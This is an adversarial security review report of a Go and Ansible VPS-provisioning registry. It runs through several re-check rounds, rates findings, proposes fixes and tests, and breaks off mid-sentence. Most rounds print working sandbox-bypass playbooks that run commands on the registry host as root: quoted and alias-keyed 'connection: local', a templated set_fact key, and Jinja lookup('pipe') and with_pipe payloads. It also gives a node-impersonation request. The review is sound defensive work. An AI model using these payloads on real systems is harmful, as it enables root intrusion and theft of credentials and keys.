# review-addendum.md — adversarial security/correctness review

Branch: `dev` @ `f622cd2`. Scope: newest work only (addendum §5–§7,
implementation-summary-addendum, api-contract §8, design-qa Round 5) and the
named code files. Read-only review of application code; no commit. Only this
report was written.

Method: read the named sources; **falsified claims by running throwaway probes**
against the exact regex/YAML library the sandbox uses (`regexp` + `gopkg.in/yaml.v3`,
outside the repo).

## VERDICT

**NO-GO for production.** One CRITICAL (sandbox bypass → arbitrary command
execution on the registry host, as root) and one HIGH (cross-node impersonation
with a personal `node_secret` under the default config) must be fixed and
re-reviewed first. The money invariants (claim c) hold; the invite concurrency
(claim e) and provider-id non-leak (claim f) hold with minor caveats.

| # | Sev | Claim | Verdict |
|---|-----|-------|---------|
| CRITICAL-1 | CRITICAL | (a) playbook can't touch registry host | **FALSE** — sandbox bypassed |
| HIGH-2 | HIGH | (d) node_secret can't act for another node_id | **FALSE** under default config |
| MED-3 | MEDIUM | (a) `--limit` enforcement | Missing (defense-in-depth) |
| MED-4 | MEDIUM | (g) selection regroup on decrease | Extra slots not trimmed |
| MED-5 | MEDIUM | (c) quota slot on cancel | Slot leaked (no double charge) |
| MED-6 | MEDIUM | (f) provider internals leak | `last_error` carries provider body |
| LOW-7 | LOW | (e) invite used_by | Only last user shown |
| LOW-8 | LOW | (d) secret masking | Masking skipped on exec-error path |

Claims (b) [extra-var names], (c) [no double `CreateVps`], (e) [invite
concurrency], (f) [provider VPS id] are **upheld** subject to the caveats below.

---

## CRITICAL-1 — Playbook sandbox bypass → remote code execution on the registry host

**Files:** `registry/internal/ansible/sandbox.go:22,24,41-53`,
`registry/internal/ansible/runner.go:79-103`,
`registry/internal/provision/provision.go:337`.

The sandbox relies on (1) a regex for `connection: local` and (2) a
lowercased substring search for `delegate_to`/`local_action`/`delegate_facts`/
`add_host`, plus (3) a structural check of the play's `hosts` value. There is
**no structural check of the `connection` play keyword and no scan of play
`vars`.**

**Counterexample playbook (saved via `POST /api/me/profiles`, then run via
`POST /api/me/vps`):**

```yaml
- hosts: all
  connection: "local"
  tasks:
    - ansible.builtin.command: id     # runs ON THE REGISTRY as root
```

`ansible.ValidatePlaybook` accepts it: the regex `(?i)\bconnection\s*:\s*local\b`
does not match a quoted value; the token list has no entry; `hosts: all` is not
local. At run time `Runner.Run` executes
`ansible-playbook -i "<vpsIP>," --private-key <key> -u root <tmp.yml>`; the
`connection: local` play keyword makes Ansible run the tasks on the **controller**
(the registry), not the VPS.

Equivalent bypasses confirmed by probe (sandbox accepted all):

```
connection: "local"        -> not rejected
connection: 'local'        -> not rejected
"connection": local        -> not rejected   (quoted key)
ansible_connection: local  -> not rejected   (\b does not match after '_')
```
under a play such as `- hosts: all` / `vars: { ansible_connection: local }`.

This defeats the entire §3 sandbox and the "residual risk = only the user's own
VPS" documentation. It is a direct path to root RCE on the registry (its SSH
keys, `registry.toml`, Beget master key, control.db).

**Fix (must be structural, not textual):**
1. In `ValidatePlaybook`, after parsing, walk every play and every task mapping
   and reject a key named `connection`, `delegate_to`, `local_action`,
   `add_host`, `delegate_facts` (case-insensitive), and any play/task `vars` key
   that is `ansible_connection`/`ansible_host`/`ansible_user`/any `ansible_*`.
2. Require the play's `hosts` to be exactly the literal `"all"` and reject any
   `hosts` value containing `{{` (templated host patterns can resolve to
   `localhost` / the implicit localhost).
3. Keep the existing `guardPlayHosts`/`guardTarget` and the single-host
   inventory, but treat them as defence-in-depth, not the primary control.
4. Textual deny of `ansible_connection` as an extra layer (accept false
   positives).

## HIGH-2 — `node_secret` bearer can act for another `node_id` (default config)

**File:** `registry/internal/server/api_auth.go:120-127` (`gateMachineAuth`).

```go
if info.kind == machineAuthNode {
    if !r.legacySharedSecretEnabled() && info.ownerNodeID != nodeID {
        // 403
    }
    return true
}
```

The owner check only runs when the legacy shared secret is **disabled**. The
default is enabled: `users.allow_shared_secret` unset → `defaultAllow=true`
(`users_control.go:46-52`), seeded into `settings`. So with a stock install, a
node holding its own `node_secret` can call `/heartbeat`, `/config`,
`/health-report` (all gated only by `gateMachineAuth`, e.g.
`run_main_impl.go:330`) with `{"node_id":"<other-node>"}` and be accepted.

Counterexample: `POST /heartbeat` body `{"node_id":"victim-abc12"}`, header
`Authorization: Bearer <attacker's own node_secret>` → 200, victim's
`LastHeartbeat`/counters updated / victim's config served to attacker.

Note `/register` is *not* affected the same way: `authorizeUserRegister`
(`users_control.go:155`) still requires `ownerNodeID == body.NodeID`, otherwise
it needs a valid authkey. The exposure is the heartbeat/config/health endpoints.

**Fix:** enforce ownership unconditionally for personal secrets — change the
condition to `if info.ownerNodeID != nodeID { 403 }` regardless of
`legacySharedSecretEnabled()`. The legacy shared *token* path (`kind == shared`)
is unaffected. Claims (d) "never returned/logged" hold: no read endpoint returns
`node_secret`; only `POST /register` returns it (`run_main_impl.go:302-311`,
`no-store`), and it is not logged (only `node_id` + error).

## MED-3 — `--limit` is never passed to `ansible-playbook`

**File:** `registry/internal/ansible/runner.go:90-95`.

The spec says "`--limit`". The inventory `-i "<host>,"` is single-host, which is
why a `hosts: <other-ip>` play matches nothing — but the Ansible **implicit
localhost** is always in inventory and is not restricted by a single-host
`-i`. `--limit=<vps_host>` is the cheap belt-and-braces that would also blunt
CRITICAL-1 and any future `add_host`/templating gap.

**Fix:** append `--limit`, `req.Host` to `args`.

## MED-4 — Reducing `masters_per_domain` doesn't shrink existing slot lists

**Files:** `registry/internal/server/selection_core.go:351-371` (`fillEmpty`),
`registry/internal/server/run_main_impl.go:918-932`.

`fillEmpty` only grows (`for len(nodes) < st.Masters`); no pass trims
`Assignments[d]`/`AssignmentsSince[d]` when `Masters` decreases (e.g. 3 → 1 via
`PUT /panel/api/config`). The domain keeps its extra holders and DNS is pushed
with more A-records than configured until those holders fail. No crash:
`ResolveMastersPerDomain` (`config.go:626-634`) clamps 0/9, and `setSince`
(left as-is) pads absent `AssignmentsSince` keys, so absent keys / zero/absent
`selection` are safe.

**Fix:** after `fillEmpty`, for each domain crop `Assignments[d]` and
`AssignmentsSince[d]` to `Masters`, emitting `masterLost` for the dropped slots
(mirrors `dropNodeFromSlots`).

## MED-5 — Quota slot leaked on cancel / pre-paid failure (no double charge)

**Files:** `registry/internal/control/nodes.go:42-82` (`AuthorizeNode`),
`registry/internal/server/cabinet_beget.go:308` (bind before order),
`registry/internal/server/cabinet_beget.go:489-531` (cancel),
`registry/internal/provision/provision.go:177-181` (region reject).

`AuthorizeNode` binds `node_owners` before the paid call (correct for §7.1), but
binding is never undone by user cancellation or by a failure *before* the paid
request (`failed`). Because quota counts `node_owners` (`UsedSlots`,
`ReserveCreateOperation`), a cancelled `pending` order permanently occupies a
slot until an admin calls `release-node`. Fails safe against double-charge, but
surprising UX and a slot leak.

**Fix:** on successful `CancelPendingOperation` (and on `failed`-before-`sent`),
call `ReleaseNode(nodeID)` for that operation's node; keep the current
"slot stays" behaviour only for provider-error/unknown/waiting_vps.

## MED-6 — Provider error body / request id surfaced to the user

**Files:** `registry/internal/provision/provision.go:215-221`,
`registry/internal/beget/client.go:79-90,176-182`,
`registry/internal/server/cabinet_beget.go:209-229`.

`settleCreate` stores `err.Error()` into `operations.last_error`, and
`operationJSON.LastError` returns it to the user. `beget.APIError.Error()`
includes `truncate(e.Body, 300)` and `x-request-id`/`x-error-result` are captured.
Could expose provider internals (request ids, raw body). `has_vps` correctly
hides `provider_vps_id`, and `region`/`config_id` are not echoed by
`operationJSON`, so the core claim (f) holds.

**Fix:** store a fixed message for non-validation provider errors (or strip the
raw `Body`/request-id before persisting).

## LOW-7 — Multi-use invite shows only the last consumer

`registry/internal/control/invites.go:144-147` overwrites `used_by`/`used_at` on
every consume; the list (`invites_admin_api.go:103-113`) therefore shows one
`used_by_username` even for `max_uses>1`. `used_count`/`status` are correct.
Cosmetic; note in UI ("N/M used").

## LOW-8 — Masking skipped on the exec-error path

`registry/internal/provision/provision.go:440` stores
`truncateOutput(runErr.Error())` without `MaskSecrets`. In practice the exec
error is just "exit status N" (vars are in argv, not output), so no secret leaks
today — but mask here too for defence-in-depth.

---

## Confirmed-sound (adversarial attempts that failed)

- **(b) forbidden extra-var names.** `ValidateProfileVarsSchema`
  (`profiles.go:451`) on save and `ValidateExtraVars` (`:491`) before run reject
  `ansible_*`, `hosts`, `connection`, `delegate_to`, `local_action`,
  `remote_user`, `inventory` case-insensitively; name regex blocks whitespace
  tricks. Extra-vars cannot set connection. (The connection override exists via
  the *playbook*, not extra-vars — see CRITICAL-1.)
- **(c) money.** Exactly one `CreateVps`: `UNIQUE(idem_key)` +
  `ReserveCreateOperation` `ON CONFLICT DO NOTHING` (`operations.go:76-92,115-146`),
  `MarkCreateSent` CAS (`:244-253`) vs `CancelPendingOperation` CAS (`:259-268`);
  `RetryInstall` never calls `Create` (`provision.go:510-545`); `waiting_vps`
  and confirmed `unknown` do not re-order; concurrent same-key returns existing
  with `created=false`; `AuthorizeNode` reserves the slot before the paid call.
  A cross-user same-key race is rejected with `ErrIdemConflict` before any
  `CreateVps`.
- **(e) invites.** Field validation runs before the transaction
  (`invites.go:115-125`); the conditional `UPDATE ... used_count < max_uses`
  (`:144-147`) plus a single-connection SQLite pool (`control.go:65`)
  serializes writers; exhausted/revoked/expired roll back the user insert
  (`classifyInviteTx`). Cannot exceed `max_uses`; validation failures don't
  consume uses.
- **(f) provider VPS id.** `operationJSON` exposes `has_vps` only; `nodeJSON`
  exposes no provider ids.
- **(g) crash-safety.** `ResolveMastersPerDomain` clamps 0/9; `setSince` pads
  absent keys; missing `selection` on PUT = no-op. (Functional gap on decrease
  only — MED-4.)
- YAML merge-key / alias evasion of `hosts` does **not** work: `yaml.v3` resolves
  `<<: {hosts: localhost}` and `&h localhost` to `hosts: localhost`, which
  `guardPlayHosts` catches (verified by probe).

---

## Pre-deploy checks (exact)

1. `cd registry && go vet ./... && go test -race -count=1 ./... && go build -mod=readonly ./... && golangci-lint run ./...` (as in AGENTS.md).
2. Add and pass an adversarial sandbox test: the file with
   `- hosts: all\n  connection: "local"` and the
   `vars: { ansible_connection: local }` variant must be rejected by
   `ansible.ValidatePlaybook` (currently: accepted).
3. Add a machine-auth test: with shared secret enabled, a `node_secret` bearer
   for node A calling `/heartbeat` with `node_id=B` must be 403.
4. Add a selection test: `Masters=3` → `Masters=1` leaves no domain with
   `len(Assignments[d]) > 1`.
5. Add a quota test: cancel a `pending` order → `UsedSlots` returns to the prior
   value.
6. Confirm `ansible-playbook` is invoked with `--limit <vps_host>`.

Do not deploy until CRITICAL-1 and HIGH-2 are fixed and re-reviewed.

---

## Re-check round 2 (independent, read-only) — fixes in `registry/`

Branch `dev`, working tree (fixes uncommitted; `internal/ansible`, `internal/beget`,
`internal/provision`, `cabinet_beget.go` are untracked, `api_auth.go`/`selection_core.go`
modified). Method: read the fix sources and new tests; **re-ran adversarial probes against
the exact `gopkg.in/yaml.v3` code path and the real `ansible-playbook` (core 2.21.4) on
this host**; ran the new tests.

| # | Sev | Claim (post-fix) | Verdict |
|---|-----|------------------|---------|
| CRITICAL-1 | CRITICAL | playbook can't run on the registry host | **FAIL — bypass survives** |
| MED-3 | MED | `--limit` + `--connection=ssh` present | **PASS** (with caveat) |
| HIGH-2 | HIGH | node-secret bound to own node_id on all machine routes | **PASS** |
| MED-4 | MED | decrease of `masters_per_domain` shrinks slots/DNS set | **PASS** |
| MED-5 | MED | slot released only pre-send | **PASS** |
| MED-6 | MED | provider body/request-id absent from `last_error` | **PASS** |

### CRITICAL-1 — FAIL (new structural bypass: alias-keyed `connection`)

The recursive node walk in `sandbox.go` reads the key from `k.Value`
(`checkKey(strings.ToLower(strings.TrimSpace(k.Value)), v)`, `sandbox.go:104`). For an
`yaml.AliasNode` key that value is the **anchor name**, not the referenced scalar, and the
walk never resolves `k.Alias`. Textual layers miss it too: the regex needs `connection`
adjacent to `: local`; the token list has no bare `connection`. `yaml.v3` reports the
alias-key node as `kind=16 tag="" value="k"` (probed), so the key is invisible.

Concrete counterexample (accepted by `ValidatePlaybook`; `PyYAML` resolves it to
`connection: local` — Ansible itself prints *"Using last defined value only."*):

```yaml
- hosts: all
  ? &k connection
  : ssh
  ? *k
  : local
  tasks:
    - ansible.builtin.command: id
```

Probe results on this host:

- `ValidatePlaybook` → `nil` (accepted).
- `python3 -c "import yaml; print(yaml.safe_load(...))"` → `[{'hosts': 'all', 'connection': 'local', 'tasks': []}]`.
- `ansible-playbook -i "192.0.2.1," --private-key /dev/null -u root --connection=ssh --limit 192.0.2.1 pb.yml`
  → `changed: [192.0.2.1]` and the task (`touch /tmp/...`) executed **on the controller**.

This defeats the whole §3 sandbox → root RCE on the registry, same impact as round 1.
It also shows `--limit`/`--connection=ssh` are **not** a backstop for `connection: local`
(see MED-3).

**Validated minimal fix** (probed in a throwaway copy, no repo edit): resolve alias keys
before classifying —

```go
// in checkNode's mapping loop, before the merge/checkKey logic:
if k.Kind == yaml.AliasNode && k.Alias != nil {
    k = k.Alias
}
```

After this one-line resolution the counterexample is rejected
(`only 'connection: ssh' is allowed, got "local"`) and all existing sandbox tests
(accept-valid, reject-forbidden, structural counterexamples) still pass. Recommend adding
the alias-key case to `TestValidatePlaybookStructuralCounterexamples` permanently.

Other vectors re-probed and **still rejected** (no surviving bypass): merge keys `<<`
(literal, quoted, alias, sequence-of-aliases), block scalars (`connection: |` → `local\n`),
quoted keys/values, `ansible_connection` in play/task/block/nested vars, `delegate_to`
literal/templated/list/nested, `add_host` under `ansible.builtin.*`/`community.general.*`/
`action:`/`action.module`, duplicate keys, `!!str` tags, hosts anchor/alias. Multi-document
YAML (second doc unchecked) is **not** exploitable: `ansible-playbook` 2.21 rejects it
(`Expected a single document in the stream but found another document`). Benign accepts
(`no_hosts`, `module_defaults`, `include_tasks`) do not execute on the controller.

### MED-3 — PASS, caveat

`runner.go:97-98` always adds `--connection=ssh` and `--limit req.Host`
(`TestRunPassesLimitAndSSHConnection`). **Caveat:** `--limit` is not the claimed backstop.
Probe: a play `hosts: all` + `connection: local` under `--limit 192.0.2.1` still ran the
task locally (`--limit` only filters inventory targets; `connection: local` executes on the
controller anyway). `--limit` does blunt a bare `hosts: localhost` play ("skipping: no hosts
matched"). The load-bearing control is the structural `connection` check — which CRITICAL-1
still bypasses.

### HIGH-2 — PASS

`api_auth.go:123-133` now enforces `info.ownerNodeID != nodeID → 403` for `kind==machineAuthNode`
unconditionally (legacy toggle removed from that branch). All five machine routes pass a
node id into `gateMachineAuth`: `/register` (`body.NodeID`, +`body.AuthKey`),
`/heartbeat` (`body.NodeID`), `/report` (`payload.NodeID`), `/retire` (`body.NodeID`),
`/config` (`X-ShareDD-Node-ID`). `NodeSecretOwner` returns the owning `node_id`
(`nodes_secret.go:38`), so a personal secret for A with `node_id=B` is rejected on every
route; absent `X-ShareDD-Node-ID` on `/config` also → 403 (owner non-empty ≠ ""). The legacy
shared *token* (`kind==shared`) remains global by design and has no owner to enforce —
unchanged, correct. `TestNodeSecretOwnershipEnforcedWithLegacySharedOn` passes.

### MED-4 — PASS

`selection_core.go:373-402` trims `Assignments[d]`/`AssignmentsSince[d]` down to `Masters`
for `len(nodes) > Masters`, emitting `masterLost` per dropped slot and appending a
`domainChange{ToID: keeper}` so `evaluateAssignments` re-enqueues the full DNS set
(`run_main_impl.go:949-959`). `Masters>=1` guarantees a non-empty keeper. Test passes.

### MED-5 — PASS

`ReleaseNode` is called only on pre-send transitions: `cabinet_beget.go:531` after the CAS
`pending→failed` cancel wins; `provision.go:180` on catalog/region validation failure
(before `MarkCreateSent`); `provision.go:487` on missing runner (no paid call). After
`MarkCreateSent` the send path never releases (`settleCreate` unknown/validation keep the
slot), and `waiting_vps` keeps it. `TestCreatePreSendFailureReleasesSlot`,
`TestCreatePostSendFailureKeepsSlot`, `TestCancelReleasesQuotaSlot` pass.

### MED-6 — PASS

`beget.APIError.Summary()` (`client.go:97-108`) returns code/message/status only; no
`Body`/`RequestID`. `provision.providerErrMessage` (`provision.go:576`) is used for all
`last_error` writes from provider errors (`settleCreate`, `Remove`). `TestProviderErrorNotLeakedIntoLastError`
passes. (`APIError.Error()` still embeds `truncate(Body,300)`, but no persistence path uses it.)

### VERDICT — **NO-GO for production**

CRITICAL-1 is **not** fixed: an alias-keyed `connection` passes the structural walk, is
resolved to `connection: local` by Ansible's PyYAML, and executes arbitrary modules on the
registry host as root (`--limit`/`--connection=ssh` do not stop it). HIGH-2 and MED-3..MED-6
are resolved.

**Exact pre-deploy checks (re-run after the alias-key fix):**

1. `cd registry && go vet ./... && go test -race -count=1 ./... && go build -mod=readonly ./... && golangci-lint run ./...` (AGENTS.md).
2. Add the alias-key counterexample above to `TestValidatePlaybookStructuralCounterexamples`
   and require rejection; keep the accept-valid cases green.
3. End-to-end guard (optional but recommended): save the counterexample via
   `POST /api/me/profiles` → must return `playbook_rejected`; run via a real
   `ansible-playbook` (2.21) with `--limit <host> --connection=ssh` and confirm the play is
   refused before execution.
4. Re-review only after (1)–(2) pass; unrelated to the other findings, which are verified.

---

## Re-check round 3 (independent, read-only) — alias fix + new runtime-injection bypass

Branch `dev`, working tree. Method: copied `registry/internal/ansible/sandbox.go`
verbatim into a throwaway module (`/tmp`), drove **47+ constructed inputs** through
the real `ValidatePlaybook`, resolved each accepted case with **PyYAML 6.0.3**, and
ran every accepted case through **`ansible-playbook` core 2.21.4** with the runner's
exact flags. A rootless sshd on `127.0.0.1:2222` modelled the reachable VPS. No repo
file was modified except this report.

### Alias fix — HOLDS

Every alias/merge/duplicate/unicode/structural vector from round 2 and the wider
matrix is now **REJECTED** (see table). The one-line `resolveAlias` on key **and**
value closes the round-2 counterexample, and the `seen` map terminates cyclic
aliases. `TestValidatePlaybook*` pass (`go test -race ./internal/ansible/...` ok).

### BUT — NEW CRITICAL: runtime connection injection via templated `set_fact` key

The structural walk only rejects **literal** `ansible_*` keys; the textual layer
only matches the literal substring `ansible_connection`. Ansible **templates
`set_fact` argument keys at runtime**, so a key that concatenates to
`ansible_connection` is invisible to the sandbox but honoured by Ansible:

```yaml
- hosts: all
  gather_facts: false
  tasks:
    - name: benign first task (runs on the VPS over ssh)
      ansible.builtin.command: echo on-vps
    - name: pivot connection to local on the controller
      ansible.builtin.set_fact:
        "{{ 'ansible_' ~ 'connection' }}": local
    - name: controller-side execution (registry host, as root)
      ansible.builtin.command: touch /tmp/pwned_r3_e2e
```

- `ValidatePlaybook` → **ACCEPTED** (no literal `ansible_connection`; key is a
  template).
- End-to-end, mirroring `runner.go` (`-i host, --connection=ssh --limit <vps>` with
  a **reachable** sshd): task 1 `changed` on the "VPS"; after the `set_fact`, task 3
  `changed` and **`/tmp/pwned_r3_e2e` was created on the controller**.
  `--limit`/`--connection=ssh` did **not** stop it — the fact switches the transport
  to `local`.

Same class, also ACCEPTED (not separately E2E'd, identical mechanism):
`set_fact: { "{{ k }}": local }` with attacker extra-var `k=ansible_connection`
(extra-vars carry arbitrary strings; only *names* are validated, and `k` is legal).

**Why the existing controls miss it.** (a) `checkKey` rejects `ansible_*` only for
literal keys; a `{{ … }}` key does not prefix-match. (b) The textual
`strings.Contains(low, "ansible_connection")` is defeated by splitting the literal
(`'ansible_' ~ 'connection'`). (c) `--connection=ssh` is a CLI default that both the
`set_fact` fact and an explicit `connection:` keyword outrank (variable precedence).
(d) `ValidateExtraVars` rejects forbidden *names* but not a benign-name value that
Ansible later templates into one.

**Validated, cheap backstop (probed here):** pin the connection through
**extra-vars**, the highest-precedence source. `-e ansible_connection=ssh` beat both
`set_fact: ansible_connection=local` **and** an explicit `connection: local` play
keyword (tests A and B: the task then attempted ssh and failed, i.e. no local run).
Since `ValidateExtraVars` already forbids user vars named `ansible_*`, the runner can
safely inject `ansible_connection: ssh` into its `-e` blob.

**Recommended fix (defence in depth):**
1. `runner.go`: add `ansible_connection: ssh` to the `-e` JSON (keep `--connection=ssh`),
   injected after user-var validation. This alone neutralises the class.
2. `sandbox.go`: reject any mapping **key** containing `{{` or `{%` (templated
   keyword), and treat a non-literal key at a keyword position as forbidden
   (fail-closed). Optionally restrict to a module allow-list.
3. Forbid external-file/role loaders in user playbooks: `import_playbook`,
   `import_tasks`/`include_tasks`, `import_role`/`include_role`, `roles`,
   `vars_files`, `include_vars` — see the MEDIUM note below.

### Attempt table

Runner flags: `--connection=ssh --limit <host>`, reachable sshd target. "controller
exec?" = a task ran on the controller (marker file appeared locally).

| # | Input (class) | Sandbox | Controller exec? |
|---|---|---|---|
| 1 | `connection: local` (plain) | REJECTED | no |
| 2 | round-2 alias key `? &k connection / : ssh / ? *k / : local` | REJECTED | no |
| 3 | alias key `? &k connection / : local` | REJECTED | no |
| 4 | alias **value** `vars: {cc: &cc local}` + `connection: *cc` | REJECTED | no |
| 5 | task `connection: local` after play `connection: ssh` | REJECTED | no |
| 6 | task alias-key `connection: local` after play `ssh` | REJECTED | no |
| 7 | alias-key `connection` inside `vars` mapping | REJECTED | no |
| 8 | alias inside `block` | REJECTED | no |
| 9 | alias whole task mapping (`- &t {…connection: local} / - *t`) | REJECTED | no |
| 10 | merge key `<<: *mapping-with-connection` | REJECTED | no |
| 11 | merge key `<<: [*a,*b]` (seq of aliases, one local) | REJECTED | no |
| 12 | merge key literal `<<: {connection: local}` | REJECTED | no |
| 13 | `? !!merge connection : local` (tag spoof, scalar) | REJECTED | no |
| 14 | `? !!merge connection : {ssh: null}` (tag spoof, mapping) | **ACCEPTED** | **no** — PyYAML → `{ssh:None}`; Ansible syntax-errors (col 6) |
| 15 | quoted merge key `"<<": local` | **ACCEPTED** | **no** — PyYAML key `<<`; Ansible rejects (col 3) |
| 16 | self-ref `tasks: &x [*x]` | ACCEPTED | no — Ansible errors |
| 17 | self-ref `vars: &x {a: *x}` | ACCEPTED | no — parsed; tasks `[]`; ssh only |
| 18 | self-ref `block: &b [*b]` | ACCEPTED | no — Ansible errors |
| 19 | mutually-referential anchors | REJECTED | no (unknown anchor) |
| 20 | dup `connection: ssh` then `local` | REJECTED | no |
| 21 | dup `connection: local` then `ssh` | REJECTED | no (fail-closed) |
| 22 | dup `hosts: all` then `localhost` | REJECTED | no |
| 23 | key `"\x63onnection": local` | REJECTED | no |
| 24 | key `"\u0063onnection": local` | REJECTED | no |
| 25 | key `"ansible_conn\x65ction": local` in vars | REJECTED | no |
| 26 | nested sequence-of-mappings with `connection: local` | REJECTED | no |
| 27 | deeper nested seq-of-mappings | REJECTED | no |
| 28 | mapping-as-key `? {connection: local} : x` | REJECTED | no |
| 29 | mapping-as-key via alias `? &k {connection: local} : x` | REJECTED | no |
| 30 | multiple documents (2nd = `connection: local`) | REJECTED | no |
| 31 | `hosts: "all"` | ACCEPTED | no (targets VPS) |
| 32 | `hosts: ALL` | ACCEPTED | no — no host matched (rc 0, warning) |
| 33 | `hosts: >- all` (folded) | ACCEPTED | no (targets VPS) |
| 34 | `hosts: &h all` | ACCEPTED | no (targets VPS) |
| 35 | `hosts:` null / `[all]` / templated / `127.0.0.1` | REJECTED | no |
| 36 | alias-key `add_host` (`\x74`) | REJECTED | no |
| 37 | alias-key `delegate_to` (`\x74`) | REJECTED | no |
| 38 | alias-key `local_action` (`\x6e`) | REJECTED | no |
| 39 | alias-value `delegate_to: *d` | REJECTED | no |
| 40 | `connection: !!binary bG9jYWw=` | REJECTED | no |
| 41 | **`set_fact: {"{{ 'ansible_' ~ 'connection' }}": local}`** | **ACCEPTED** | **YES — CRITICAL** |
| 42 | `set_fact: {"{{ k }}": local}`, extra-var `k=ansible_connection` | **ACCEPTED** | **YES** (same class) |
| 43 | `set_fact: "{{ payload }}"`, extra-var `payload={ansible_connection: local}` | ACCEPTED | no — set_fact does not set the var (test C) |
| 44 | play `vars: {"{{ … }}": local}` | ACCEPTED | no — Ansible rejects (var name not an identifier) |
| 45 | `import_playbook: <existing file>` | ACCEPTED | **capability yes** — loads a controller file; requires a pre-existing playbook file (none attacker-writable; only random temp names) |
| 46 | `roles: [evilrole]` | ACCEPTED | no — needs a role on `roles_path` (not attacker-controlled) |
| 47 | `vars: {ansible_connection: local}` (literal) | REJECTED | no |

### Verdict — **NO-GO for production**

- The round-2 alias-key bypass is **fixed** (all 1–13, 19–39 REJECTED; alias/merge/
  duplicate/unicode/nested/multi-doc/hosts-var/aliased-module all closed).
- A **new CRITICAL survives**: templated `set_fact` key → `ansible_connection: local`
  → arbitrary module execution **on the registry host as root**, accepted by the
  sandbox and executed end-to-end under the runner's own `--limit`/`--connection=ssh`.
  Impact identical to CRITICAL-1 (registry SSH keys, `registry.toml`, Beget master
  key, `control.db`).
- Residual **MEDIUM**: `import_playbook`/`roles`/include loaders are accepted; they
  only bite if a suitable file/role exists on the controller (none attacker-writable
  today) — reject them anyway.

**Exact pre-deploy checks (after the fix):**

1. `cd registry && go test -race -count=1 ./internal/ansible/...` plus the full
   `go vet ./... && go test -race ./... && go build -mod=readonly ./... && golangci-lint run ./...`.
2. Add to `TestValidatePlaybookStructuralCounterexamples` (must REJECT): the
   templated-key `set_fact` playbook (#41/#42) and the templated key `"{{ 'x' }}"` at
   play level; and to `runner_test.go`: assert the `-e` JSON contains
   `"ansible_connection":"ssh"`.
3. E2E guard: with a reachable sshd, the #41 playbook under the runner must **not**
   create a controller-side marker.
4. Re-review CRITICAL before deploy. HIGH-2/MED-3..MED-6 remain verified from round 2.

---

## Re-check round 4 (independent, read-only) — runner backstop verified; new controller-exec bypass class survives

Branch `dev`, working tree. Method: copied `sandbox.go`/`runner.go` verbatim into a
throwaway module (`/tmp/probe4`, no repo edit), drove constructed inputs through the
**real `ValidatePlaybook`**, printed the runner's **built argv** via a copy of
`Runner.Run`, and executed every accepted case with the runner's exact flags
(`--connection=ssh --limit <host> -e <userjson> -e ansible_connection=ssh`) under
**`ansible-playbook` core 2.21.4**. A rootless sshd on `127.0.0.1:2222` modelled a
reachable VPS; a TEST-NET host (`203.0.113.9`, unroutable) was used to detect whether
the connection resolved to `ssh` (unreachable → no marker) or `local` (marker on the
controller). Controller exec is a marker file appearing in `/tmp/probe4/`. Repo tests:
`go test -race -count=1 ./internal/ansible/...` → **ok**.

### Runner backstop — HOLDS (ordering is load-bearing)

Built argv (no user vars): `-i <host>, --private-key <K> -u root --connection=ssh
--limit <host> --ssh-common-args=... -e ansible_connection=ssh <pb>`; with vars the
user JSON is the **first** `-e` and the backstop is the **last**. Runtime precedence
probed with real ansible:

| Vector | Marker on controller? | Meaning |
|---|---|---|
| `-e {json ansible_connection:local}` **then** `-e ansible_connection=ssh` (runner order) | absent | backstop wins ✅ |
| only `-e ansible_connection=ssh` | absent | pinned ✅ |
| play keyword `connection: local` + backstop | absent | extra-vars override keyword ✅ |
| `set_fact: ansible_connection=local` (literal) + backstop | absent | extra-vars override set_fact ✅ |
| env `ANSIBLE_CONNECTION=local` + backstop | absent | env is lower precedence ✅ |
| **backstop FIRST, user `{json local}` LAST** (order reversed) | **PRESENT** | ⚠ later-wins — the fix's "last `-e`" ordering is essential, and `Runner.Run` keeps it. |

Conclusion: `-e ansible_connection=ssh` **as the last `-e`** defeats every
connection-variable mechanism (keyword, `set_fact`, env, user `-e`). Reordering
(`runner.go:101-114`) would reintroduce CRITICAL-1. Keep the backstop last; add a
regression assertion on ordering (already present: `TestRunPinsAnsibleConnectionViaExtraVars`).

### BUT — surviving bypass class: controller-side Jinja/action primitives

The sandbox now rejects literal/aliased/templated **keys** and literal `ansible_*`
names, but **values** are unrestricted ("Only KEYS are restricted") and several
Ansible **action/lookup plugins execute on the controller regardless of
`connection`**. Extra-vars cannot stop this: these run during template
expansion / action-plugin execution, not via the connection variable. Every case
below was **ACCEPTED** by `ValidatePlaybook` and reproduced on the controller.

| # | Input (class) | Sandbox | Controller effect |
|---|---|---|---|
| 1 | `debug: msg="{{ lookup('pipe','touch M; id') }}"` | ACCEPTED | **RCE** (uid of registry process) |
| 2 | `{{ lookup ('pipe','touch M') }}` (space) | ACCEPTED | **RCE** |
| 3 | `{{ (lookup)('pipe','touch M') }}` | ACCEPTED | **RCE** |
| 4 | `{{ q('pipe','touch M') }}` | ACCEPTED | **RCE** |
| 5 | `{{ (q)('pipe','touch M') }}` | ACCEPTED | **RCE** |
| 6 | `{% set f = lookup %}{{ f('pipe','touch M') }}` | ACCEPTED | **RCE** |
| 7 | `{% set f = q %}{{ f('pipe','touch M') }}` | ACCEPTED | **RCE** |
| 8 | `loop: "{{ lookup('pipe','touch M') }}"` | ACCEPTED | **RCE** |
| 9 | `with_lines: "touch M; id"` | ACCEPTED | **RCE** (no `lookup(` token) |
| 10 | `with_pipe: "touch M; id"` | ACCEPTED | **RCE** (no `lookup(` token) |
| 11 | `lookup('file','/etc/hostname')` | ACCEPTED | controller file read |
| 12 | `lookup('env','SHELL')` | ACCEPTED | controller env read |
| 13 | `lookup('template','/etc/hostname')` | ACCEPTED | controller file read |
| 14 | `with_fileglob: "/etc/*"` | ACCEPTED | controller file enumeration |
| 15 | `fetch: {src:/etc/hostname, dest:/tmp/probe4/fetched.txt, flat:true}` | ACCEPTED | **arbitrary controller file write** (content attacker-controlled via their own VPS) |
| 16 | `copy: {src:/etc/hostname, dest:...}` / `template: {src:<controller path>}` | ACCEPTED | controller file read (exfil) |
| 17 | loaders via FQCN/other spellings: `ansible.builtin.include_role`, `ansible.legacy.include_tasks`, `community.general.include_vars`, `ansible.builtin.import_playbook`, `vars_files`, `import_role`, bare `include` | ACCEPTED | loads controller plays/roles/files (needs an existing file/role) |

Attempts that **differ** and failed (no bypass): `globals()` is undefined
(`'globals' is undefined`); `__class__`/`__init__`/`__getattribute__` access is
blocked by Ansible (`access to attribute '…' of '…' object is unsafe`); bare
`{{ lookup }}`/`{{ q }}` error (`function … unsupported for variable storage`).
So the callable name must appear literally — but it can be split across
